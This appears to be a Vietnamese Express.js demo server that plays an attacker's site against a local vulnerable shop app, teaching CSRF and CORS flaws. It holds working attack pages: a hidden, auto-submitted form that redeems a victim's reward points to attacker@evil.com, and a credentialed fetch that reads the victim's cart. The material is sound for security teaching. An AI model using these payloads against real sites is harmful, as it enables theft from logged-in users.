const express = require('express');
const app = express();
const PORT = 4000;

const page = (title, body) => `<!DOCTYPE html>
<html lang="vi"><head><meta charset="UTF-8"><title>${title}</title>
<link rel="stylesheet" href="http://localhost:3000/style.css"></head>
<body><div class="card">
<h1 style="color:#c0392b">⚠ Trang ngoài (localhost:4000)</h1>
<p style="color:#888">Trang này đóng vai một site khác (đối tác hoặc kẻ tấn công), KHÔNG phải ShopVN (port 3000).</p>
${body}
<p><a class="back-link" href="http://localhost:3000">&larr; Quay lại ShopVN</a></p>
</div></body></html>`;

app.get('/', (req, res) => {
  res.send(page('Trang ngoài', `
    <div class="grid">
      <a class="product-card evil" href="/redeem-attack"><h3>CSRF: Đổi trộm điểm thưởng</h3><p>Tự động submit form đổi điểm của nạn nhân khi họ mở trang này.</p></a>
      <a class="product-card evil" href="/cart-attack"><h3>CORS: Đánh cắp giỏ hàng</h3><p>Đọc trộm /api/cart của ShopVN kèm cookie nạn nhân.</p></a>
      <a class="product-card evil" href="/no-cors-data"><h3>Endpoint không CORS</h3><p>Dùng cho demo Same-Origin Policy ở trang chủ ShopVN.</p></a>
    </div>`));
});

app.get('/no-cors-data', (req, res) => {
  res.send('[Đối tác] Dữ liệu nội bộ - không nên đọc được từ origin khác!');
});

app.get('/redeem-attack', (req, res) => {
  res.send(page('CSRF - Đổi trộm điểm', `
    <div class="product-card evil" style="padding:20px">Khi trang này load, nó tự động submit một form ẩn tới
    <code>http://localhost:3000/redeem</code>, đổi <b>400 điểm thưởng</b> của nạn nhân thành mã giảm giá
    gửi về email kẻ tấn công - miễn là nạn nhân đã từng mở ShopVN trong cùng trình duyệt (có cookie session).</div>
    <form id="f" action="http://localhost:3000/redeem" method="POST" style="display:none">
      <input type="hidden" name="to" value="attacker@evil.com">
      <input type="hidden" name="amount" value="400">
    </form>
    <p>Form đã được tự động submit. <a href="http://localhost:3000/cart">Kiểm tra điểm thưởng tại ShopVN →</a></p>
    <script>document.getElementById('f').submit();</script>`));
});

app.get('/cart-attack', (req, res) => {
  res.send(page('CORS - Đánh cắp giỏ hàng', `
    <div class="product-card evil" style="padding:20px">Trang này gọi
    <code>fetch('http://localhost:3000/api/cart', {credentials:'include'})</code> từ origin khác.
    Vì ShopVN phản chiếu Origin và cho phép credentials, dữ liệu giỏ hàng + điểm thưởng bị đọc trộm thành công.</div>
    <button onclick="steal()">Đánh cắp dữ liệu</button>
    <pre id="out">(kết quả sẽ hiện ở đây)</pre>
    <script>
    async function steal() {
      try {
        const r = await fetch('http://localhost:3000/api/cart', { credentials: 'include' });
        document.getElementById('out').textContent = await r.text();
      } catch (e) {
        document.getElementById('out').textContent = 'Thất bại: ' + e.message;
      }
    }
    </script>`));
});

app.listen(PORT, () => {
  console.log(`Trang ngoài chạy tại http://localhost:${PORT}`);
});
